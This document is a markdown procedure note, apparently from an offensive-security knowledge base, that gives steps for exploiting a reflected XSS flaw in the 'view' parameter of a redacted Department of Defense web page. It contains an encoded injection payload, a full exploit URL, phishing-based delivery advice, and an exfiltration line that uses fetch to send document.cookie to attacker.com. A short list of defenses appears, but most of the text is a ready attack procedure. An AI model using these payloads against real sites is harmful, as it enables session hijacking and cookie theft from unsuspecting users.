---
tags:
  - xss
  - reflected-xss
  - web
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.984Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 297bb388-32fc-4d18-a673-2d12d739a714
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-and-Deliver-Reflected-XSS-Payload

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability by crafting a malicious URL with encoded JavaScript payloads in the 'view' parameter of a web application, delivering it to a victim, and achieving arbitrary script execution in their browser to steal cookies, hijack sessions, or perform actions on their behalf.

## Description

In this attack scenario, targeting a U.S. Department of Defense web application at /tags/image/sizzle-reel, user input from the 'view' parameter is reflected unsanitized in the HTML response. Attackers encode payloads to inject HTML attributes like AutoFocus and OnFocus, triggering JavaScript upon user interaction. This allows execution in the victim's context, enabling data exfiltration (e.g., document.cookie), session theft, or further attacks. Prerequisites include knowledge of URL encoding and basic social engineering for delivery. Expected outcomes: prompt/alert execution confirming success, followed by data theft.

## Requirements

1. Access to a browser or URL encoder for crafting payloads
2. Knowledge of the target endpoint (/tags/image/sizzle-reel) and parameter ('view')
3. Method to deliver URL to victim (e.g., email, link sharing)
4. Attacker-controlled server for data exfiltration (optional for advanced payloads)

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML-escape user inputs)
- Use Content Security Policy (CSP) to restrict inline scripts and eval
- Deploy Web Application Firewall (WAF) to detect XSS patterns in parameters
- Monitor for anomalous JavaScript execution or unexpected network requests from browsers

## Objectives

1. Inject and reflect malicious JavaScript in the victim's browser
2. Execute arbitrary code to access sensitive data like cookies and sessions
3. Enable impersonation or data modification as the victim

## Instructions

### Step 1: Encode and Craft the Payload

**Context**: Create an encoded JavaScript payload that injects an HTML element with event handlers to bypass sanitization.

Use manual encoding or a tool like Burp Suite to URL-encode special characters. The payload example uses quotes, ampersands, and newlines to close tags and inject attributes.

Example payload construction:

```url
view=K0X%22%20AutoFocus%20%2526%252362%20OnFocus%0c%3dprompt%601%60%20kaos%3d%22uwps2
```

> This decodes to: view=K0X" AutoFocus &# OnFocus
=prompt`1` kaos="uwps2, injecting <input autofocus onfocus=prompt`1`> effectively.

### Step 2: Construct and Test the Full URL

**Context**: Append the payload to the target endpoint and verify reflection without execution.

Build the complete URL and access it in a test browser to confirm the parameter is reflected in the HTML source.

Full URL example:

```url
https://www.██████/tags/image/sizzle-reel?&view=K0X%22%20AutoFocus%20%2526%252362%20OnFocus%0c%3dprompt%601%60%20kaos%3d%22uwps2&sort=date
```

> Inspect the response HTML to see the unsanitized 'view' value, confirming vulnerability.

### Step 3: Deliver and Trigger Execution

**Context**: Share the URL with the victim and ensure interaction triggers the event.

Send via phishing or direct link. The victim's browser will parse the reflected input, creating the element. Focus on it (e.g., via tab or click) to fire OnFocus and execute prompt`1`.

For exfiltration, modify payload to: onfocus="fetch('https://attacker.com?data='+document.cookie)"

> Success: Script runs, showing prompt or sending data; check attacker server logs for received info.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[payload-injection]]
